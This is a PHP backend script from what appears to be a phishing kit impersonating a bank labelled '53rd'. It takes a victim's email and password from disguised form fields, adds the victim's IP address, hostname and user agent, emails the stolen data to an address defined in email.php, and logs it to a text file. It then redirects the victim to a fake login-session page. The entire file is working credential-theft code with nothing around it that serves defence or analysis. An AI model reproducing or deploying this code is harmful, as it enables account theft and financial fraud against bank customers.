<?php
if($_POST["errem8393"] != "" and $_POST["paser9300"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------53rd Info-----------------------\n";
$message .= "|3mail error : ".$_POST['errem8393']."\n";
$message .= "|Pa33w0rd error: ".$_POST['paser9300']."\n";
$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'email.php';
$subject = "Result from 53rd| ".$ip."\n";
mail(','.$form,$subject,$message);
    $text = fopen('sgh.txt', 'a');
fwrite($text, $message);
mail($to,$subject,$message);
$par=base64_encode(rand());
header("location: info.php?cmd=login_submit&id=$aga$aga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>

 